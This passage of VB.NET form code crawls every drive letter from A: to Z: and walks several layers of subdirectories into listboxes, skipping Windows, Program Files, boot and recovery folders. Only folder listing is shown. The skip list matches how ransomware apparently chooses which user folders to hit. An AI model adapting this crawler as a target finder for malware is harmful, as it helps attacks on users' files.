Public Class Form3
    Dim filenamez As String
    Private Sub Form3_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If IO.Directory.Exists("C:\") Then
            If IO.Directory.Exists("D:\") Then
                Try
                    For Each fdir As String In My.Computer.FileSystem.GetDirectories("C:\")
                        If fdir.EndsWith("Bin") Then
                        Else
                            If fdir.EndsWith("indows") Then
                            Else
                                If fdir.EndsWith("tings") Then
                                Else
                                    If fdir.EndsWith("System Volume Information") Then
                                    Else
                                        If fdir.EndsWith("cache") Then
                                        Else
                                            If fdir.EndsWith("very") Then
                                            Else
                                                If fdir.EndsWith("rogram Files (x86)") Then
                                                Else
                                                    If fdir.EndsWith("rogram Files") Then
                                                    Else
                                                        If fdir.EndsWith("boot") Then
                                                        Else
                                                            If fdir.EndsWith("efi") Then
                                                            Else
                                                                If fdir.EndsWith(".old") Then
                                                                Else
                                                                    ListBox1.Items.Add(fdir)
                                                                    ListBox9.Items.Add(fdir)
                                                                End If

                                                            End If
                                                        End If
                                                    End If
                                                End If

                                            End If
                                        End If
                                    End If
                                End If
                            End If
                        End If

                    Next
                Catch ex As Exception
                End Try
                Try
                    For Each fdir As String In My.Computer.FileSystem.GetDirectories("D:\")
                        If fdir.EndsWith("Bin") Then
                        Else
                            If fdir.EndsWith("indows") Then
                            Else
                                If fdir.EndsWith("tings") Then
                                Else
                                    If fdir.EndsWith("System Volume Information") Then
                                    Else
                                        If fdir.EndsWith("cache") Then
                                        Else
                                            If fdir.EndsWith("very") Then
                                            Else
                                                If fdir.EndsWith("rogram Files (x86)") Then
                                                Else
                                                    If fdir.EndsWith("rogram Files") Then
                                                    Else
                                                        If fdir.EndsWith("boot") Then
                                                        Else
                                                            If fdir.EndsWith("efi") Then
                                                            Else
                                                                If fdir.EndsWith(".old") Then
                                                                Else
                                                                    ListBox1.Items.Add(fdir)
                                                                    ListBox9.Items.Add(fdir)
                                                                End If

                                                            End If
                                                        End If
                                                    End If
                                                End If

                                            End If
                                        End If
                                    End If
                                End If
                            End If
                        End If

                    Next
                Catch ex As Exception
                End Try
            End If
        Else
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("A:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("B:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("C:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("D:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("E:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("F:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("G:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("H:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("I:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("J:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("K:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("L:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("M:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("N:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("O:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("P:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("Q:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("R:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("S:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("T:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("U:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("V:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("W:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("X:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("Y:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("Z:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try

        End If
        'layer 2
        Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ProgressBar1.Maximum = ListBox1.Items.Count
        If ProgressBar1.Value = ListBox1.Items.Count Then
            Timer1.Stop()
            Timer2.Start()
        Else
            ListBox1.SelectedIndex = ProgressBar1.Value

            ListBox1.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox1.SelectedItem)
            Try

                For Each fdir As String In My.Computer.FileSystem.GetDirectories(filenamez)
                    ListBox2.Items.Add(fdir)
                    ListBox9.Items.Add(fdir)
                Next

            Catch ex As Exception

            End Try
            ProgressBar1.Increment(1)
        End If
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        ProgressBar2.Maximum = ListBox2.Items.Count
        If ProgressBar2.Value = ListBox2.Items.Count Then
            Timer2.Stop()
            Timer3.Start()
        Else
            ListBox2.SelectedIndex = ProgressBar2.Value
            ListBox2.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox2.SelectedItem)
            Try

                For Each fdir As String In My.Computer.FileSystem.GetDirectories(filenamez)
                    ListBox3.Items.Add(fdir)
                    ListBox9.Items.Add(fdir)
                Next

            Catch ex As Exception

            End Try
            ProgressBar2.Increment(1)
        End If
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        ProgressBar3.Maximum = ListBox3.Items.Count
        If ProgressBar3.Value = ListBox3.Items.Count Then
            Timer3.Stop()
            Timer4.Start()
        Else
            ListBox3.SelectedIndex = ProgressBar3.Value

            ListBox3.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox3.SelectedItem)
            Try

                For Each fdir As String In My.Computer.FileSystem.GetDirectories(filenamez)
                    ListBox4.Items.Add(fdir)
                    ListBox9.Items.Add(fdir)
                Next

            Catch ex As Exception

            End Try
            ProgressBar3.Increment(1)
        End If
    End Sub

    Private Sub Timer4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer4.Tick
        ProgressBar4.Maximum = ListBox4.Items.Count
        If ProgressBar4.Value = ListBox4.Items.Count Then
            Timer4.Stop()
            Timer5.Start()
        Else
            ListBox4.SelectedIndex = ProgressBar4.Value

            ListBox4.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox4.SelectedItem)
            Try

                For Each fdir As String In My.Computer.FileSystem.GetDirectories(filenamez)
                    ListBox5.Items.Add(fdir)
                    ListBox9.Items.Add(fdir)
                Next

            Catch ex As Exception

            End Try
            ProgressBar4.Increment(1)
        End If
    End Sub

    Private Sub Timer5_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer5.Tick
        ProgressBar5.Maximum = ListBox5.Items.Count
        If ProgressBar5.Value = ListBox5.Items.Count Then
            Timer5.Stop()
            Timer6.Start()
        Else
            ListBox5.SelectedIndex = ProgressBar5.Value

            ListBox5.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox5.SelectedItem)
            Try

                For Each fdir As String In My.Computer.FileSystem.GetDirectories(filenamez)
                    ListBox6.Items.Add(fdir)
                    ListBox9.Items.Add(fdir)
                Next

            Catch ex As Exception

            End Try
            ProgressBar5.Increment(1)
        End If
    End Sub

    Private Sub Timer6_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer6.Tick
        ProgressBar6.Maximum = ListBox6.Items.Count
        If ProgressBar6.Value = ListBox6.Items.Count Then
            Timer6.Stop()
            Timer7.Start()
        Else
            ListBox6.SelectedIndex = ProgressBar6.Value

            ListBox6.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox6.SelectedItem)
            Try

                For Each fdir As String In My.Computer.FileSystem.GetDirectories(filenamez)
